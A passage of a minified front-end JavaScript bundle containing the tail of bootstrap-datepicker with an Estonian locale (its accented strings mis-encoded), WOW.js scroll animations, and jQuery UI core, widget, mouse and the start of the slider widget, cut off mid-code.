    r.template = '<div class="datepicker"><div class="datepicker-days"><table class="table-condensed">' + r.headTemplate + "<tbody></tbody>" + r.footTemplate + '</table></div><div class="datepicker-months"><table class="table-condensed">' + r.headTemplate + r.contTemplate + r.footTemplate + '</table></div><div class="datepicker-years"><table class="table-condensed">' + r.headTemplate + r.contTemplate + r.footTemplate + '</table></div><div class="datepicker-decades"><table class="table-condensed">' + r.headTemplate + r.contTemplate + r.footTemplate + '</table></div><div class="datepicker-centuries"><table class="table-condensed">' + r.headTemplate + r.contTemplate + r.footTemplate + "</table></div></div>",
    a.fn.datepicker.DPGlobal = r,
    a.fn.datepicker.noConflict = function() {
        return a.fn.datepicker = m,
        this
    }
    ,
    a.fn.datepicker.version = "1.8.0",
    a.fn.datepicker.deprecated = function(a) {
        var b = window.console;
        b && b.warn && b.warn("DEPRECATED: " + a)
    }
    ,
    a(document).on("focus.datepicker.data-api click.datepicker.data-api", '[data-provide="datepicker"]', function(b) {
        var c = a(this);
        c.data("datepicker") || (b.preventDefault(),
        n.call(c, "show"))
    }),
    a(function() {
        n.call(a('[data-provide="datepicker-inline"]'))
    })
});
!function(a) {
    a.fn.datepicker.dates.et = {
        days: ["PÃ¼hapÃ¤ev", "EsmaspÃ¤ev", "TeisipÃ¤ev", "KolmapÃ¤ev", "NeljapÃ¤ev", "Reede", "LaupÃ¤ev"],
        daysShort: ["PÃ¼hap", "Esmasp", "Teisip", "Kolmap", "Neljap", "Reede", "Laup"],
        daysMin: ["P", "E", "T", "K", "N", "R", "L"],
        months: ["Jaanuar", "Veebruar", "MÃ¤rts", "Aprill", "Mai", "Juuni", "Juuli", "August", "September", "Oktoober", "November", "Detsember"],
        monthsShort: ["Jaan", "Veebr", "MÃ¤rts", "Apr", "Mai", "Juuni", "Juuli", "Aug", "Sept", "Okt", "Nov", "Dets"],
        today: "TÃ¤na",
        clear: "TÃ¼hjenda",
        weekStart: 1,
        format: "dd.mm.yyyy"
    }
}(jQuery);
/*! WOW wow.js - v1.3.0 - 2016-10-04
* https://wowjs.uk
* Copyright (c) 2016 Thomas Grainger; Licensed MIT */
!function(a, b) {
    if ("function" == typeof define && define.amd)
        define(["module", "exports"], b);
    else if ("undefined" != typeof exports)
        b(module, exports);
    else {
        var c = {
            exports: {}
        };
        b(c, c.exports),
        a.WOW = c.exports
    }
}(this, function(a, b) {
    "use strict";
    function c(a, b) {
        if (!(a instanceof b))
            throw new TypeError("Cannot call a class as a function")
    }
    function d(a, b) {
        return b.indexOf(a) >= 0
    }
    function e(a, b) {
        for (var c in b)
            if (null == a[c]) {
                var d = b[c];
                a[c] = d
            }
        return a
    }
    function f(a) {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(a)
    }
    function g(a) {
        var b = arguments.length <= 1 || void 0 === arguments[1] ? !1 : arguments[1]
          , c = arguments.length <= 2 || void 0 === arguments[2] ? !1 : arguments[2]
          , d = arguments.length <= 3 || void 0 === arguments[3] ? null : arguments[3]
          , e = void 0;
        return null != document.createEvent ? (e = document.createEvent("CustomEvent"),
        e.initCustomEvent(a, b, c, d)) : null != document.createEventObject ? (e = document.createEventObject(),
        e.eventType = a) : e.eventName = a,
        e
    }
    function h(a, b) {
        null != a.dispatchEvent ? a.dispatchEvent(b) : b in (null != a) ? a[b]() : "on" + b in (null != a) && a["on" + b]()
    }
    function i(a, b, c) {
        null != a.addEventListener ? a.addEventListener(b, c, !1) : null != a.attachEvent ? a.attachEvent("on" + b, c) : a[b] = c
    }
    function j(a, b, c) {
        null != a.removeEventListener ? a.removeEventListener(b, c, !1) : null != a.detachEvent ? a.detachEvent("on" + b, c) : delete a[b]
    }
    function k() {
        return "innerHeight"in window ? window.innerHeight : document.documentElement.clientHeight
    }
    Object.defineProperty(b, "__esModule", {
        value: !0
    });
    var l, m, n = function() {
        function a(a, b) {
            for (var c = 0; c < b.length; c++) {
                var d = b[c];
                d.enumerable = d.enumerable || !1,
                d.configurable = !0,
                "value"in d && (d.writable = !0),
                Object.defineProperty(a, d.key, d)
            }
        }
        return function(b, c, d) {
            return c && a(b.prototype, c),
            d && a(b, d),
            b
        }
    }(), o = window.WeakMap || window.MozWeakMap || function() {
        function a() {
            c(this, a),
            this.keys = [],
            this.values = []
        }
        return n(a, [{
            key: "get",
            value: function(a) {
                for (var b = 0; b < this.keys.length; b++) {
                    var c = this.keys[b];
                    if (c === a)
                        return this.values[b]
                }
            }
        }, {
            key: "set",
            value: function(a, b) {
                for (var c = 0; c < this.keys.length; c++) {
                    var d = this.keys[c];
                    if (d === a)
                        return this.values[c] = b,
                        this
                }
                return this.keys.push(a),
                this.values.push(b),
                this
            }
        }]),
        a
    }(), p = window.MutationObserver || window.WebkitMutationObserver || window.MozMutationObserver || (m = l = function() {
        function a() {
            c(this, a),
            "undefined" != typeof console && null !== console && (console.warn("MutationObserver is not supported by your browser."),
            console.warn("WOW.js cannot detect dom mutations, please call .sync() after loading new content."))
        }
        return n(a, [{
            key: "observe",
            value: function() {}
        }]),
        a
    }(),
    l.notSupported = !0,
    m), q = window.getComputedStyle || function(a) {
        var b = /(\-([a-z]){1})/g;
        return {
            getPropertyValue: function(c) {
                "float" === c && (c = "styleFloat"),
                b.test(c) && c.replace(b, function(a, b) {
                    return b.toUpperCase()
                });
                var d = a.currentStyle;
                return (null != d ? d[c] : void 0) || null
            }
        }
    }
    , r = function() {
        function a() {
            var b = arguments.length <= 0 || void 0 === arguments[0] ? {} : arguments[0];
            c(this, a),
            this.defaults = {
                boxClass: "wow",
                animateClass: "animated",
                offset: 0,
                mobile: !0,
                live: !0,
                callback: null,
                scrollContainer: null,
                resetAnimation: !0
            },
            this.animate = function() {
                return "requestAnimationFrame"in window ? function(a) {
                    return window.requestAnimationFrame(a)
                }
                : function(a) {
                    return a()
                }
            }(),
            this.vendors = ["moz", "webkit"],
            this.start = this.start.bind(this),
            this.resetAnimation = this.resetAnimation.bind(this),
            this.scrollHandler = this.scrollHandler.bind(this),
            this.scrollCallback = this.scrollCallback.bind(this),
            this.scrolled = !0,
            this.config = e(b, this.defaults),
            null != b.scrollContainer && (this.config.scrollContainer = document.querySelector(b.scrollContainer)),
            this.animationNameCache = new o,
            this.wowEvent = g(this.config.boxClass)
        }
        return n(a, [{
            key: "init",
            value: function() {
                this.element = window.document.documentElement,
                d(document.readyState, ["interactive", "complete"]) ? this.start() : i(document, "DOMContentLoaded", this.start),
                this.finished = []
            }
        }, {
            key: "start",
            value: function() {
                var a = this;
                if (this.stopped = !1,
                this.boxes = [].slice.call(this.element.querySelectorAll("." + this.config.boxClass)),
                this.all = this.boxes.slice(0),
                this.boxes.length)
                    if (this.disabled())
                        this.resetStyle();
                    else
                        for (var b = 0; b < this.boxes.length; b++) {
                            var c = this.boxes[b];
                            this.applyStyle(c, !0)
                        }
                if (this.disabled() || (i(this.config.scrollContainer || window, "scroll", this.scrollHandler),
                i(window, "resize", this.scrollHandler),
                this.interval = setInterval(this.scrollCallback, 50)),
                this.config.live) {
                    var d = new p(function(b) {
                        for (var c = 0; c < b.length; c++)
                            for (var d = b[c], e = 0; e < d.addedNodes.length; e++) {
                                var f = d.addedNodes[e];
                                a.doSync(f)
                            }
                    }
                    );
                    d.observe(document.body, {
                        childList: !0,
                        subtree: !0
                    })
                }
            }
        }, {
            key: "stop",
            value: function() {
                this.stopped = !0,
                j(this.config.scrollContainer || window, "scroll", this.scrollHandler),
                j(window, "resize", this.scrollHandler),
                null != this.interval && clearInterval(this.interval)
            }
        }, {
            key: "sync",
            value: function() {
                p.notSupported && this.doSync(this.element)
            }
        }, {
            key: "doSync",
            value: function(a) {
                if ("undefined" != typeof a && null !== a || (a = this.element),
                1 === a.nodeType) {
                    a = a.parentNode || a;
                    for (var b = a.querySelectorAll("." + this.config.boxClass), c = 0; c < b.length; c++) {
                        var e = b[c];
                        d(e, this.all) || (this.boxes.push(e),
                        this.all.push(e),
                        this.stopped || this.disabled() ? this.resetStyle() : this.applyStyle(e, !0),
                        this.scrolled = !0)
                    }
                }
            }
        }, {
            key: "show",
            value: function(a) {
                return this.applyStyle(a),
                a.className = a.className + " " + this.config.animateClass,
                null != this.config.callback && this.config.callback(a),
                h(a, this.wowEvent),
                this.config.resetAnimation && (i(a, "animationend", this.resetAnimation),
                i(a, "oanimationend", this.resetAnimation),
                i(a, "webkitAnimationEnd", this.resetAnimation),
                i(a, "MSAnimationEnd", this.resetAnimation)),
                a
            }
        }, {
            key: "applyStyle",
            value: function(a, b) {
                var c = this
                  , d = a.getAttribute("data-wow-duration")
                  , e = a.getAttribute("data-wow-delay")
                  , f = a.getAttribute("data-wow-iteration");
                return this.animate(function() {
                    return c.customStyle(a, b, d, e, f)
                })
            }
        }, {
            key: "resetStyle",
            value: function() {
                for (var a = 0; a < this.boxes.length; a++) {
                    var b = this.boxes[a];
                    b.style.visibility = "visible"
                }
            }
        }, {
            key: "resetAnimation",
            value: function(a) {
                if (a.type.toLowerCase().indexOf("animationend") >= 0) {
                    var b = a.target || a.srcElement;
                    b.className = b.className.replace(this.config.animateClass, "").trim()
                }
            }
        }, {
            key: "customStyle",
            value: function(a, b, c, d, e) {
                return b && this.cacheAnimationName(a),
                a.style.visibility = b ? "hidden" : "visible",
                c && this.vendorSet(a.style, {
                    animationDuration: c
                }),
                d && this.vendorSet(a.style, {
                    animationDelay: d
                }),
                e && this.vendorSet(a.style, {
                    animationIterationCount: e
                }),
                this.vendorSet(a.style, {
                    animationName: b ? "none" : this.cachedAnimationName(a)
                }),
                a
            }
        }, {
            key: "vendorSet",
            value: function(a, b) {
                for (var c in b)
                    if (b.hasOwnProperty(c)) {
                        var d = b[c];
                        a["" + c] = d;
                        for (var e = 0; e < this.vendors.length; e++) {
                            var f = this.vendors[e];
                            a["" + f + c.charAt(0).toUpperCase() + c.substr(1)] = d
                        }
                    }
            }
        }, {
            key: "vendorCSS",
            value: function(a, b) {
                for (var c = q(a), d = c.getPropertyCSSValue(b), e = 0; e < this.vendors.length; e++) {
                    var f = this.vendors[e];
                    d = d || c.getPropertyCSSValue("-" + f + "-" + b)
                }
                return d
            }
        }, {
            key: "animationName",
            value: function(a) {
                var b = void 0;
                try {
                    b = this.vendorCSS(a, "animation-name").cssText
                } catch (c) {
                    b = q(a).getPropertyValue("animation-name")
                }
                return "none" === b ? "" : b
            }
        }, {
            key: "cacheAnimationName",
            value: function(a) {
                return this.animationNameCache.set(a, this.animationName(a))
            }
        }, {
            key: "cachedAnimationName",
            value: function(a) {
                return this.animationNameCache.get(a)
            }
        }, {
            key: "scrollHandler",
            value: function() {
                this.scrolled = !0
            }
        }, {
            key: "scrollCallback",
            value: function() {
                if (this.scrolled) {
                    this.scrolled = !1;
                    for (var a = [], b = 0; b < this.boxes.length; b++) {
                        var c = this.boxes[b];
                        if (c) {
                            if (this.isVisible(c)) {
                                this.show(c);
                                continue
                            }
                            a.push(c)
                        }
                    }
                    this.boxes = a,
                    this.boxes.length || this.config.live || this.stop()
                }
            }
        }, {
            key: "offsetTop",
            value: function(a) {
                for (; void 0 === a.offsetTop; )
                    a = a.parentNode;
                for (var b = a.offsetTop; a.offsetParent; )
                    a = a.offsetParent,
                    b += a.offsetTop;
                return b
            }
        }, {
            key: "isVisible",
            value: function(a) {
                var b = a.getAttribute("data-wow-offset") || this.config.offset
                  , c = this.config.scrollContainer && this.config.scrollContainer.scrollTop || window.pageYOffset
                  , d = c + Math.min(this.element.clientHeight, k()) - b
                  , e = this.offsetTop(a)
                  , f = e + a.clientHeight;
                return d >= e && f >= c
            }
        }, {
            key: "disabled",
            value: function() {
                return !this.config.mobile && f(navigator.userAgent)
            }
        }]),
        a
    }();
    b["default"] = r,
    a.exports = b["default"]
});
(function(e, t) {
    function i(t, i) {
        var s, a, o, r = t.nodeName.toLowerCase();
        return "area" === r ? (s = t.parentNode,
        a = s.name,
        t.href && a && "map" === s.nodeName.toLowerCase() ? (o = e("img[usemap=#" + a + "]")[0],
        !!o && n(o)) : !1) : (/input|select|textarea|button|object/.test(r) ? !t.disabled : "a" === r ? t.href || i : i) && n(t)
    }
    function n(t) {
        return e.expr.filters.visible(t) && !e(t).parents().addBack().filter(function() {
            return "hidden" === e.css(this, "visibility")
        }).length
    }
    var s = 0
      , a = /^ui-id-\d+$/;
    e.ui = e.ui || {},
    e.extend(e.ui, {
        version: "1.10.4",
        keyCode: {
            BACKSPACE: 8,
            COMMA: 188,
            DELETE: 46,
            DOWN: 40,
            END: 35,
            ENTER: 13,
            ESCAPE: 27,
            HOME: 36,
            LEFT: 37,
            NUMPAD_ADD: 107,
            NUMPAD_DECIMAL: 110,
            NUMPAD_DIVIDE: 111,
            NUMPAD_ENTER: 108,
            NUMPAD_MULTIPLY: 106,
            NUMPAD_SUBTRACT: 109,
            PAGE_DOWN: 34,
            PAGE_UP: 33,
            PERIOD: 190,
            RIGHT: 39,
            SPACE: 32,
            TAB: 9,
            UP: 38
        }
    }),
    e.fn.extend({
        focus: function(t) {
            return function(i, n) {
                return "number" == typeof i ? this.each(function() {
                    var t = this;
                    setTimeout(function() {
                        e(t).focus(),
                        n && n.call(t)
                    }, i)
                }) : t.apply(this, arguments)
            }
        }(e.fn.focus),
        scrollParent: function() {
            var t;
            return t = e.ui.ie && /(static|relative)/.test(this.css("position")) || /absolute/.test(this.css("position")) ? this.parents().filter(function() {
                return /(relative|absolute|fixed)/.test(e.css(this, "position")) && /(auto|scroll)/.test(e.css(this, "overflow") + e.css(this, "overflow-y") + e.css(this, "overflow-x"))
            }).eq(0) : this.parents().filter(function() {
                return /(auto|scroll)/.test(e.css(this, "overflow") + e.css(this, "overflow-y") + e.css(this, "overflow-x"))
            }).eq(0),
            /fixed/.test(this.css("position")) || !t.length ? e(document) : t
        },
        zIndex: function(i) {
            if (i !== t)
                return this.css("zIndex", i);
            if (this.length)
                for (var n, s, a = e(this[0]); a.length && a[0] !== document; ) {
                    if (n = a.css("position"),
                    ("absolute" === n || "relative" === n || "fixed" === n) && (s = parseInt(a.css("zIndex"), 10),
                    !isNaN(s) && 0 !== s))
                        return s;
                    a = a.parent()
                }
            return 0
        },
        uniqueId: function() {
            return this.each(function() {
                this.id || (this.id = "ui-id-" + ++s)
            })
        },
        removeUniqueId: function() {
            return this.each(function() {
                a.test(this.id) && e(this).removeAttr("id")
            })
        }
    }),
    e.extend(e.expr[":"], {
        data: e.expr.createPseudo ? e.expr.createPseudo(function(t) {
            return function(i) {
                return !!e.data(i, t)
            }
        }) : function(t, i, n) {
            return !!e.data(t, n[3])
        }
        ,
        focusable: function(t) {
            return i(t, !isNaN(e.attr(t, "tabindex")))
        },
        tabbable: function(t) {
            var n = e.attr(t, "tabindex")
              , s = isNaN(n);
            return (s || n >= 0) && i(t, !s)
        }
    }),
    e("<a>").outerWidth(1).jquery || e.each(["Width", "Height"], function(i, n) {
        function s(t, i, n, s) {
            return e.each(a, function() {
                i -= parseFloat(e.css(t, "padding" + this)) || 0,
                n && (i -= parseFloat(e.css(t, "border" + this + "Width")) || 0),
                s && (i -= parseFloat(e.css(t, "margin" + this)) || 0)
            }),
            i
        }
        var a = "Width" === n ? ["Left", "Right"] : ["Top", "Bottom"]
          , o = n.toLowerCase()
          , r = {
            innerWidth: e.fn.innerWidth,
            innerHeight: e.fn.innerHeight,
            outerWidth: e.fn.outerWidth,
            outerHeight: e.fn.outerHeight
        };
        e.fn["inner" + n] = function(i) {
            return i === t ? r["inner" + n].call(this) : this.each(function() {
                e(this).css(o, s(this, i) + "px")
            })
        }
        ,
        e.fn["outer" + n] = function(t, i) {
            return "number" != typeof t ? r["outer" + n].call(this, t) : this.each(function() {
                e(this).css(o, s(this, t, !0, i) + "px")
            })
        }
    }),
    e.fn.addBack || (e.fn.addBack = function(e) {
        return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
    }
    ),
    e("<a>").data("a-b", "a").removeData("a-b").data("a-b") && (e.fn.removeData = function(t) {
        return function(i) {
            return arguments.length ? t.call(this, e.camelCase(i)) : t.call(this)
        }
    }(e.fn.removeData)),
    e.ui.ie = !!/msie [\w.]+/.exec(navigator.userAgent.toLowerCase()),
    e.support.selectstart = "onselectstart"in document.createElement("div"),
    e.fn.extend({
        disableSelection: function() {
            return this.bind((e.support.selectstart ? "selectstart" : "mousedown") + ".ui-disableSelection", function(e) {
                e.preventDefault()
            })
        },
        enableSelection: function() {
            return this.unbind(".ui-disableSelection")
        }
    }),
    e.extend(e.ui, {
        plugin: {
            add: function(t, i, n) {
                var s, a = e.ui[t].prototype;
                for (s in n)
                    a.plugins[s] = a.plugins[s] || [],
                    a.plugins[s].push([i, n[s]])
            },
            call: function(e, t, i) {
                var n, s = e.plugins[t];
                if (s && e.element[0].parentNode && 11 !== e.element[0].parentNode.nodeType)
                    for (n = 0; s.length > n; n++)
                        e.options[s[n][0]] && s[n][1].apply(e.element, i)
            }
        },
        hasScroll: function(t, i) {
            if ("hidden" === e(t).css("overflow"))
                return !1;
            var n = i && "left" === i ? "scrollLeft" : "scrollTop"
              , s = !1;
            return t[n] > 0 ? !0 : (t[n] = 1,
            s = t[n] > 0,
            t[n] = 0,
            s)
        }
    })
}
)(jQuery);
(function(t, e) {
    var i = 0
      , s = Array.prototype.slice
      , n = t.cleanData;
    t.cleanData = function(e) {
        for (var i, s = 0; null != (i = e[s]); s++)
            try {
                t(i).triggerHandler("remove")
            } catch (o) {}
        n(e)
    }
    ,
    t.widget = function(i, s, n) {
        var o, a, r, h, l = {}, c = i.split(".")[0];
        i = i.split(".")[1],
        o = c + "-" + i,
        n || (n = s,
        s = t.Widget),
        t.expr[":"][o.toLowerCase()] = function(e) {
            return !!t.data(e, o)
        }
        ,
        t[c] = t[c] || {},
        a = t[c][i],
        r = t[c][i] = function(t, i) {
            return this._createWidget ? (arguments.length && this._createWidget(t, i),
            e) : new r(t,i)
        }
        ,
        t.extend(r, a, {
            version: n.version,
            _proto: t.extend({}, n),
            _childConstructors: []
        }),
        h = new s,
        h.options = t.widget.extend({}, h.options),
        t.each(n, function(i, n) {
            return t.isFunction(n) ? (l[i] = function() {
                var t = function() {
                    return s.prototype[i].apply(this, arguments)
                }
                  , e = function(t) {
                    return s.prototype[i].apply(this, t)
                };
                return function() {
                    var i, s = this._super, o = this._superApply;
                    return this._super = t,
                    this._superApply = e,
                    i = n.apply(this, arguments),
                    this._super = s,
                    this._superApply = o,
                    i
                }
            }(),
            e) : (l[i] = n,
            e)
        }),
        r.prototype = t.widget.extend(h, {
            widgetEventPrefix: a ? h.widgetEventPrefix || i : i
        }, l, {
            constructor: r,
            namespace: c,
            widgetName: i,
            widgetFullName: o
        }),
        a ? (t.each(a._childConstructors, function(e, i) {
            var s = i.prototype;
            t.widget(s.namespace + "." + s.widgetName, r, i._proto)
        }),
        delete a._childConstructors) : s._childConstructors.push(r),
        t.widget.bridge(i, r)
    }
    ,
    t.widget.extend = function(i) {
        for (var n, o, a = s.call(arguments, 1), r = 0, h = a.length; h > r; r++)
            for (n in a[r])
                o = a[r][n],
                a[r].hasOwnProperty(n) && o !== e && (i[n] = t.isPlainObject(o) ? t.isPlainObject(i[n]) ? t.widget.extend({}, i[n], o) : t.widget.extend({}, o) : o);
        return i
    }
    ,
    t.widget.bridge = function(i, n) {
        var o = n.prototype.widgetFullName || i;
        t.fn[i] = function(a) {
            var r = "string" == typeof a
              , h = s.call(arguments, 1)
              , l = this;
            return a = !r && h.length ? t.widget.extend.apply(null, [a].concat(h)) : a,
            r ? this.each(function() {
                var s, n = t.data(this, o);
                return n ? t.isFunction(n[a]) && "_" !== a.charAt(0) ? (s = n[a].apply(n, h),
                s !== n && s !== e ? (l = s && s.jquery ? l.pushStack(s.get()) : s,
                !1) : e) : t.error("no such method '" + a + "' for " + i + " widget instance") : t.error("cannot call methods on " + i + " prior to initialization; " + "attempted to call method '" + a + "'")
            }) : this.each(function() {
                var e = t.data(this, o);
                e ? e.option(a || {})._init() : t.data(this, o, new n(a,this))
            }),
            l
        }
    }
    ,
    t.Widget = function() {}
    ,
    t.Widget._childConstructors = [],
    t.Widget.prototype = {
        widgetName: "widget",
        widgetEventPrefix: "",
        defaultElement: "<div>",
        options: {
            disabled: !1,
            create: null
        },
        _createWidget: function(e, s) {
            s = t(s || this.defaultElement || this)[0],
            this.element = t(s),
            this.uuid = i++,
            this.eventNamespace = "." + this.widgetName + this.uuid,
            this.options = t.widget.extend({}, this.options, this._getCreateOptions(), e),
            this.bindings = t(),
            this.hoverable = t(),
            this.focusable = t(),
            s !== this && (t.data(s, this.widgetFullName, this),
            this._on(!0, this.element, {
                remove: function(t) {
                    t.target === s && this.destroy()
                }
            }),
            this.document = t(s.style ? s.ownerDocument : s.document || s),
            this.window = t(this.document[0].defaultView || this.document[0].parentWindow)),
            this._create(),
            this._trigger("create", null, this._getCreateEventData()),
            this._init()
        },
        _getCreateOptions: t.noop,
        _getCreateEventData: t.noop,
        _create: t.noop,
        _init: t.noop,
        destroy: function() {
            this._destroy(),
            this.element.unbind(this.eventNamespace).removeData(this.widgetName).removeData(this.widgetFullName).removeData(t.camelCase(this.widgetFullName)),
            this.widget().unbind(this.eventNamespace).removeAttr("aria-disabled").removeClass(this.widgetFullName + "-disabled " + "ui-state-disabled"),
            this.bindings.unbind(this.eventNamespace),
            this.hoverable.removeClass("ui-state-hover"),
            this.focusable.removeClass("ui-state-focus")
        },
        _destroy: t.noop,
        widget: function() {
            return this.element
        },
        option: function(i, s) {
            var n, o, a, r = i;
            if (0 === arguments.length)
                return t.widget.extend({}, this.options);
            if ("string" == typeof i)
                if (r = {},
                n = i.split("."),
                i = n.shift(),
                n.length) {
                    for (o = r[i] = t.widget.extend({}, this.options[i]),
                    a = 0; n.length - 1 > a; a++)
                        o[n[a]] = o[n[a]] || {},
                        o = o[n[a]];
                    if (i = n.pop(),
                    1 === arguments.length)
                        return o[i] === e ? null : o[i];
                    o[i] = s
                } else {
                    if (1 === arguments.length)
                        return this.options[i] === e ? null : this.options[i];
                    r[i] = s
                }
            return this._setOptions(r),
            this
        },
        _setOptions: function(t) {
            var e;
            for (e in t)
                this._setOption(e, t[e]);
            return this
        },
        _setOption: function(t, e) {
            return this.options[t] = e,
            "disabled" === t && (this.widget().toggleClass(this.widgetFullName + "-disabled ui-state-disabled", !!e).attr("aria-disabled", e),
            this.hoverable.removeClass("ui-state-hover"),
            this.focusable.removeClass("ui-state-focus")),
            this
        },
        enable: function() {
            return this._setOption("disabled", !1)
        },
        disable: function() {
            return this._setOption("disabled", !0)
        },
        _on: function(i, s, n) {
            var o, a = this;
            "boolean" != typeof i && (n = s,
            s = i,
            i = !1),
            n ? (s = o = t(s),
            this.bindings = this.bindings.add(s)) : (n = s,
            s = this.element,
            o = this.widget()),
            t.each(n, function(n, r) {
                function h() {
                    return i || a.options.disabled !== !0 && !t(this).hasClass("ui-state-disabled") ? ("string" == typeof r ? a[r] : r).apply(a, arguments) : e
                }
                "string" != typeof r && (h.guid = r.guid = r.guid || h.guid || t.guid++);
                var l = n.match(/^(\w+)\s*(.*)$/)
                  , c = l[1] + a.eventNamespace
                  , u = l[2];
                u ? o.delegate(u, c, h) : s.bind(c, h)
            })
        },
        _off: function(t, e) {
            e = (e || "").split(" ").join(this.eventNamespace + " ") + this.eventNamespace,
            t.unbind(e).undelegate(e)
        },
        _delay: function(t, e) {
            function i() {
                return ("string" == typeof t ? s[t] : t).apply(s, arguments)
            }
            var s = this;
            return setTimeout(i, e || 0)
        },
        _hoverable: function(e) {
            this.hoverable = this.hoverable.add(e),
            this._on(e, {
                mouseenter: function(e) {
                    t(e.currentTarget).addClass("ui-state-hover")
                },
                mouseleave: function(e) {
                    t(e.currentTarget).removeClass("ui-state-hover")
                }
            })
        },
        _focusable: function(e) {
            this.focusable = this.focusable.add(e),
            this._on(e, {
                focusin: function(e) {
                    t(e.currentTarget).addClass("ui-state-focus")
                },
                focusout: function(e) {
                    t(e.currentTarget).removeClass("ui-state-focus")
                }
            })
        },
        _trigger: function(e, i, s) {
            var n, o, a = this.options[e];
            if (s = s || {},
            i = t.Event(i),
            i.type = (e === this.widgetEventPrefix ? e : this.widgetEventPrefix + e).toLowerCase(),
            i.target = this.element[0],
            o = i.originalEvent)
                for (n in o)
                    n in i || (i[n] = o[n]);
            return this.element.trigger(i, s),
            !(t.isFunction(a) && a.apply(this.element[0], [i].concat(s)) === !1 || i.isDefaultPrevented())
        }
    },
    t.each({
        show: "fadeIn",
        hide: "fadeOut"
    }, function(e, i) {
        t.Widget.prototype["_" + e] = function(s, n, o) {
            "string" == typeof n && (n = {
                effect: n
            });
            var a, r = n ? n === !0 || "number" == typeof n ? i : n.effect || i : e;
            n = n || {},
            "number" == typeof n && (n = {
                duration: n
            }),
            a = !t.isEmptyObject(n),
            n.complete = o,
            n.delay && s.delay(n.delay),
            a && t.effects && t.effects.effect[r] ? s[e](n) : r !== e && s[r] ? s[r](n.duration, n.easing, o) : s.queue(function(i) {
                t(this)[e](),
                o && o.call(s[0]),
                i()
            })
        }
    })
}
)(jQuery);
(function(t) {
    var e = !1;
    t(document).mouseup(function() {
        e = !1
    }),
    t.widget("ui.mouse", {
        version: "1.10.4",
        options: {
            cancel: "input,textarea,button,select,option",
            distance: 1,
            delay: 0
        },
        _mouseInit: function() {
            var e = this;
            this.element.bind("mousedown." + this.widgetName, function(t) {
                return e._mouseDown(t)
            }).bind("click." + this.widgetName, function(i) {
                return !0 === t.data(i.target, e.widgetName + ".preventClickEvent") ? (t.removeData(i.target, e.widgetName + ".preventClickEvent"),
                i.stopImmediatePropagation(),
                !1) : undefined
            }),
            this.started = !1
        },
        _mouseDestroy: function() {
            this.element.unbind("." + this.widgetName),
            this._mouseMoveDelegate && t(document).unbind("mousemove." + this.widgetName, this._mouseMoveDelegate).unbind("mouseup." + this.widgetName, this._mouseUpDelegate)
        },
        _mouseDown: function(i) {
            if (!e) {
                this._mouseStarted && this._mouseUp(i),
                this._mouseDownEvent = i;
                var s = this
                  , n = 1 === i.which
                  , a = "string" == typeof this.options.cancel && i.target.nodeName ? t(i.target).closest(this.options.cancel).length : !1;
                return n && !a && this._mouseCapture(i) ? (this.mouseDelayMet = !this.options.delay,
                this.mouseDelayMet || (this._mouseDelayTimer = setTimeout(function() {
                    s.mouseDelayMet = !0
                }, this.options.delay)),
                this._mouseDistanceMet(i) && this._mouseDelayMet(i) && (this._mouseStarted = this._mouseStart(i) !== !1,
                !this._mouseStarted) ? (i.preventDefault(),
                !0) : (!0 === t.data(i.target, this.widgetName + ".preventClickEvent") && t.removeData(i.target, this.widgetName + ".preventClickEvent"),
                this._mouseMoveDelegate = function(t) {
                    return s._mouseMove(t)
                }
                ,
                this._mouseUpDelegate = function(t) {
                    return s._mouseUp(t)
                }
                ,
                t(document).bind("mousemove." + this.widgetName, this._mouseMoveDelegate).bind("mouseup." + this.widgetName, this._mouseUpDelegate),
                i.preventDefault(),
                e = !0,
                !0)) : !0
            }
        },
        _mouseMove: function(e) {
            return t.ui.ie && (!document.documentMode || 9 > document.documentMode) && !e.button ? this._mouseUp(e) : this._mouseStarted ? (this._mouseDrag(e),
            e.preventDefault()) : (this._mouseDistanceMet(e) && this._mouseDelayMet(e) && (this._mouseStarted = this._mouseStart(this._mouseDownEvent, e) !== !1,
            this._mouseStarted ? this._mouseDrag(e) : this._mouseUp(e)),
            !this._mouseStarted)
        },
        _mouseUp: function(e) {
            return t(document).unbind("mousemove." + this.widgetName, this._mouseMoveDelegate).unbind("mouseup." + this.widgetName, this._mouseUpDelegate),
            this._mouseStarted && (this._mouseStarted = !1,
            e.target === this._mouseDownEvent.target && t.data(e.target, this.widgetName + ".preventClickEvent", !0),
            this._mouseStop(e)),
            !1
        },
        _mouseDistanceMet: function(t) {
            return Math.max(Math.abs(this._mouseDownEvent.pageX - t.pageX), Math.abs(this._mouseDownEvent.pageY - t.pageY)) >= this.options.distance
        },
        _mouseDelayMet: function() {
            return this.mouseDelayMet
        },
        _mouseStart: function() {},
        _mouseDrag: function() {},
        _mouseStop: function() {},
        _mouseCapture: function() {
            return !0
        }
    })
}
)(jQuery);
(function(t) {
    var e = 5;
    t.widget("ui.slider", t.ui.mouse, {
        version: "1.10.4",
        widgetEventPrefix: "slide",
        options: {
            animate: !1,
            distance: 0,
            max: 100,
            min: 0,
            orientation: "horizontal",
            range: !1,
            step: 1,
            value: 0,
            values: null,
            change: null,
            slide: null,
            start: null,
            stop: null
        },
        _create: function() {
            this._keySliding = !1,
            this._mouseSliding = !1,
            this._animateOff = !0,
            this._handleIndex = null,
            this._detectOrientation(),
            this._mouseInit(),
            this.element.addClass("ui-slider ui-slider-" + this.orientation + " ui-widget" + " ui-widget-content" + " ui-corner-all"),
            this._refresh(),
            this._setOption("disabled", this.options.disabled),
            this._animateOff = !1
        },
        _refresh: function() {
            this._createRange(),
            this._createHandles(),
            this._setupEvents(),
            this._refreshValue()
        },
        _createHandles: function() {
            var e, i, s = this.options, n = this.element.find(".ui-slider-handle").addClass("ui-state-default ui-corner-all"), a = "<a class='ui-slider-handle ui-state-default ui-corner-all' href='#'></a>", o = [];
            for (i = s.values && s.values.length || 1,
            n.length > i && (n.slice(i).remove(),
            n = n.slice(0, i)),
            e = n.length; i > e; e++)
                o.push(a);
            this.handles = n.add(t(o.join("")).appendTo(this.element)),
            this.handle = this.handles.eq(0),
            this.handles.each(function(e) {
                t(this).data("ui-slider-handle-index", e)
            })
        },
        _createRange: function() {
            var e = this.options
              , i = "";
            e.range ? (e.range === !0 && (e.values ? e.values.length && 2 !== e.values.length ? e.values = [e.values[0], e.values[0]] : t.isArray(e.values) && (e.values = e.values.slice(0)) : e.values = [this._valueMin(), this._valueMin()]),
            this.range && this.range.length ? this.range.removeClass("ui-slider-range-min ui-slider-range-max").css({
